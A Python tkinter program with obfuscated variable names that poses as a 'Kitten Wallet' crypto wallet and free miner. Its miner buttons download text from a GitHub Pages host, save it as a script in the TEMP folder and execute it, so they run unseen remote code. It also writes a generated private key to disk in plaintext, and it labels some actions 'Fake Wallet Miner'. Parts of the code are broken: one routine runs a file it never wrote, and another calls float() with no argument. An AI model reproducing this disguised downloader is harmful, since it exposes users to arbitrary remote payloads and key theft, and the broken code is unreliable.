import re
import tkinter as tk
from tracemalloc import start
from turtle import width
import requests
import threading
import os
import json
import bitcoin
import webbrowser
from PySimpleGUI import *

theme('DarkTeal9')

TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL = tk.Tk()
CzRCiiLYhfkILmMfuhoeEoNibGSCgOlBMCOewISiFTqoEXnSZjAujajKHUMgiKAF = 600
UbYidQwHsxgxYcKAhAergbrYmnMfNxAYHlNKZtHYdYfiSdApUBuoQBTywnnmHWxe = 600
lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY = "#3632a6"
JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG = "#f7ccff"
kCxfZzNWzxlAXkssnHqdLomRHOXeNYaqBrfsgqZaTIvmzFsiinfofKBRLXwIUoZb = "|Kitten Wallet V2| \nBy Izikut"
sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl = tk.StringVar()
KgBpiQozHaquOyoaDPXYDOoJjAOODrXzpvnRJjBIHakEQqjfuWNQKhSLRbVgLlXG = tk.StringVar()
GNAEpELDJVLEUtrnfBaHrCUmjPTJAkmrNlJizgWMRsFDLDMdHSQnykwryxmpkuQg = tk.StringVar()
Eth = tk.StringVar()
NzGWDcZbtSZicrFdBVaOVsduYXtyNkarTbdaALEsuzLPCsVFNwqCJRVzpchFBNwI = tk.StringVar()
TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL.title(kCxfZzNWzxlAXkssnHqdLomRHOXeNYaqBrfsgqZaTIvmzFsiinfofKBRLXwIUoZb)
TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL.geometry(str(CzRCiiLYhfkILmMfuhoeEoNibGSCgOlBMCOewISiFTqoEXnSZjAujajKHUMgiKAF)+"x"+str(UbYidQwHsxgxYcKAhAergbrYmnMfNxAYHlNKZtHYdYfiSdApUBuoQBTywnnmHWxe))
TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL.configure(bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY)
global tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF
global IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB
if os.path.exists(os.getenv('TEMP') + "\\ze3.json"):
    f = open(os.getenv('TEMP') + "\\ze3.json", "r")
    TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum = json.load(f)
    tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF = TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum["address"]
    IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB = TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum["amount"] 
    f.close()
else:
    f = open(os.getenv('TEMP') + "\\ze3.json", "w")
    wLnWzIIpIIZHPqgSqgzIMAPTKaBWxvPmMtaUGpWTqInRBkVfEVYglpSQhYOycszC = bitcoin.random_key()
    PlPEKcXyitMDUMqOIFIHkzROviWtxFSsuneWfiARnwXfJMqPFJmshvgqUnQdjfxD = bitcoin.privtopub(wLnWzIIpIIZHPqgSqgzIMAPTKaBWxvPmMtaUGpWTqInRBkVfEVYglpSQhYOycszC)
    tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF = bitcoin.pubtoaddr(PlPEKcXyitMDUMqOIFIHkzROviWtxFSsuneWfiARnwXfJMqPFJmshvgqUnQdjfxD)
    IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB = "0"
    json.dump({
        "private": wLnWzIIpIIZHPqgSqgzIMAPTKaBWxvPmMtaUGpWTqInRBkVfEVYglpSQhYOycszC,
        "public": PlPEKcXyitMDUMqOIFIHkzROviWtxFSsuneWfiARnwXfJMqPFJmshvgqUnQdjfxD,
        "address": tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF,
        "amount": IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB
    }, f)
    f.close()
def AZUSCMxZIYypOUXEWOMjdXrHRLbiBCsAZdDgVXJnxRnKnQZqYWLIlqNHOvfEcweY():
    os.system("echo "+tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF+" | clip")
    sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set("Copied !")
def WzqhCRoAMNAKPFvlHTRMbrradZScksCZyRnWpMBfJfnqYqvhtIkbIfnPQydHgBZd():
    ArEYCBxNPcoMOtagVIHBPjPqZgnVWXaJaQfxhWNPupgPSGhMyAKqkDYtKsksXBFc = requests.get("https://api.ipify.org?format=json").json()["ip"]
    os.system("echo "+ArEYCBxNPcoMOtagVIHBPjPqZgnVWXaJaQfxhWNPupgPSGhMyAKqkDYtKsksXBFc+" | clip")
    sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set("Copied !")
def gEsXLAQASGrKycEYeWWITUrEHlrZwyfvlTmxsRVmauJjpwarYlebSWnUSyYlFBMa():
    with open(os.getenv('TEMP') + "\\freeMiner.py", "w") as pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI:
        pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI.write(requests.get("https://ecauto.github.io/Kitten/Miner1.txt").text)
    os.system("start python %temp%/freeMiner.py "+tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF)
def AQoTUTJaOqVmaXKzqKNUFnlPHObmhqgAvITKLUfzkEedIyKHjavxpTbAerGkEwkq():
    os.system("start Miner2_BTC.py")
def Miner3():
    with open(os.getenv('TEMP') + "\\freeMiner.py", "w") as pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI:
        pkVfgARPvLOJFTZMqrEFUUIBgWtAfHfIfAmLQlhlkvarrpFzeJnzzJiorFtQdoTI.write(requests.get("https://ecauto.github.io/Kitten/Miner5.txt").text)
    os.system("start python Miner5.py "+tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF)
def Miner4():
 os.system("start Fake.py")
 sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set("Fake Wallet Miner Started!")
def miner5():
    os.system("start Miner3_ETH.py")

sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set("Fake Wallet Miner Started!")
def miner6():
         os.system("start Fake2.py")
         sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set("Fake Wallet Miner Started!")
def aYaTxQfcgGqSowzhYLWdeBIpFVWsbYMdmuAwgREmnLBPpunQMWrbMbUyUPRMdMlk():
    threading.Thread(target=AZUSCMxZIYypOUXEWOMjdXrHRLbiBCsAZdDgVXJnxRnKnQZqYWLIlqNHOvfEcweY).start()
def TJMlkQJaiqwwJrzmgsIBbKDgwnOQTXsicrmLViYmszMXhHuHysoEbwOykDSddkrp():
    threading.Thread(target=WzqhCRoAMNAKPFvlHTRMbrradZScksCZyRnWpMBfJfnqYqvhtIkbIfnPQydHgBZd).start()
def uHAfcdCHNikYVzZsUZQFjrfJYjEMmKRKVBBqMSngukwdpSHYXqjESNjyldynnLQh():
    sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl.set("")
    KgBpiQozHaquOyoaDPXYDOoJjAOODrXzpvnRJjBIHakEQqjfuWNQKhSLRbVgLlXG.set("")
    f = open(os.getenv('TEMP') + "\\ze3.json", "r")
    TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum = json.load(f)
    tpGaLejgpWTnPaaBfPlsVICRQbEgkqjfqcOumxVkddbsXHrvkiGCZkwVlSwnmmkF = TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum["address"]
    IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB = TcGXQGHqQPwQFhIlzjZkAuxxPneWWrIboAFgctjlxoLWoDMqPYtwHDfRjLHwaWum["amount"]
    f.close()
    GNAEpELDJVLEUtrnfBaHrCUmjPTJAkmrNlJizgWMRsFDLDMdHSQnykwryxmpkuQg.set(str(IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB) + " BTC")
    Eth.set(str(IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB) + " ETH")
    NzGWDcZbtSZicrFdBVaOVsduYXtyNkarTbdaALEsuzLPCsVFNwqCJRVzpchFBNwI.set(str(round(int(requests.get("https://api.coinbase.com/v2/prices/spot?currency=USD").json()["data"]["amount"].split(".", 1)[0]) * float(IFPUytZFRdGbyEmLmVvjyuUyLNGHTodyOhsKAyQZhekaZIjdxmYnCuuMOZALsjjB), 2)) + " USD")
    Eth.set(str(round(int(requests.get("https://ecauto.github.io/Kitten/response.json").json()["data"]["amount"].split(".", 1)[0]) * float(), 2)) + " ETH")
def AqqNVxApSyTKMrJKmXofQYtHadhpqLoyXxWlOwWCMfzmkfQfEZkFagBHkxsTRAlT():
    os.system("start GUI.pyw")
    KgBpiQozHaquOyoaDPXYDOoJjAOODrXzpvnRJjBIHakEQqjfuWNQKhSLRbVgLlXG.set("Api Error => Soon (Use GUI)")

tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text=kCxfZzNWzxlAXkssnHqdLomRHOXeNYaqBrfsgqZaTIvmzFsiinfofKBRLXwIUoZb, font=("Courier", 20)).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, text="").pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, font=("Courier", 10), textvariable=GNAEpELDJVLEUtrnfBaHrCUmjPTJAkmrNlJizgWMRsFDLDMdHSQnykwryxmpkuQg).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, font=("Courier", 10), textvariable=Eth).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, font=("Courier", 10), textvariable=NzGWDcZbtSZicrFdBVaOVsduYXtyNkarTbdaALEsuzLPCsVFNwqCJRVzpchFBNwI).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Copy Prv Address", font=("Courier", 10), width=30, command=aYaTxQfcgGqSowzhYLWdeBIpFVWsbYMdmuAwgREmnLBPpunQMWrbMbUyUPRMdMlk).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Copy Ip", font=("Courier", 10), width=30, command=TJMlkQJaiqwwJrzmgsIBbKDgwnOQTXsicrmLViYmszMXhHuHysoEbwOykDSddkrp).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, text="").pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="BTC| Miner1 (Kitten Wallet)", font=("Courier", 10), width=30, command=gEsXLAQASGrKycEYeWWITUrEHlrZwyfvlTmxsRVmauJjpwarYlebSWnUSyYlFBMa).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="BTC| Miner2 (Wallet Wanted)", font=("Courier", 10), width=30, command=AQoTUTJaOqVmaXKzqKNUFnlPHObmhqgAvITKLUfzkEedIyKHjavxpTbAerGkEwkq).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="BTC| Miner3 (No Use Wallet)", font=("Courier", 10), width=30, command=Miner4).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="ETH| Miner4 (Kitten Wallet)", font=("Courier", 10), width=30, command=Miner3).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="ETH| Miner5 (Wallet Wanted)", font=("Courier", 10), width=30, command=miner5).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="ETH| Miner6 (No Use Wallet)", font=("Courier", 10), width=30, command=miner6).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg="#CC0000", text="", font=("Courier", 9), textvariable=sntznczYfglTuGGOUgTUaCrNuunIYlohuDuyqaJmOaEDDjGShluECllXfbLGjHvl).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Amount + Type", font=("Courier", 10)).pack()
tk.Entry(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, font=("Courier", 10), width=30).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Address BTC/ETH", font=("Courier", 10)).pack()
tk.Entry(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, font=("Courier", 10), width=30).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Transfert", font=("Courier", 10), width=30, command=AqqNVxApSyTKMrJKmXofQYtHadhpqLoyXxWlOwWCMfzmkfQfEZkFagBHkxsTRAlT).pack()
tk.Label(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg="#CC0000", text="", font=("Courier", 9), textvariable=KgBpiQozHaquOyoaDPXYDOoJjAOODrXzpvnRJjBIHakEQqjfuWNQKhSLRbVgLlXG).pack()
tk.Button(TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL, bg=lgeQlApMSltizZJMDToouFPOceOoRoLJqqNHoQWpsNbXVqhgUxyKVdFcTMVtFbiY, fg=JVuRQrRAqJvvcrnVEYfcustCblFakbLJYEaFVwBemWyLYkRRaCkVUIKBahiiQUWG, text="Refresh", font=("Courier", 10), width=30, command=uHAfcdCHNikYVzZsUZQFjrfJYjEMmKRKVBBqMSngukwdpSHYXqjESNjyldynnLQh).pack()
uHAfcdCHNikYVzZsUZQFjrfJYjEMmKRKVBBqMSngukwdpSHYXqjESNjyldynnLQh()
TQMtrEVFyrqdRTuoKzEYNcRSaqDlHQODEFupNOLYtZMOhplmbPRQdNDJaFdEkugL.mainloop()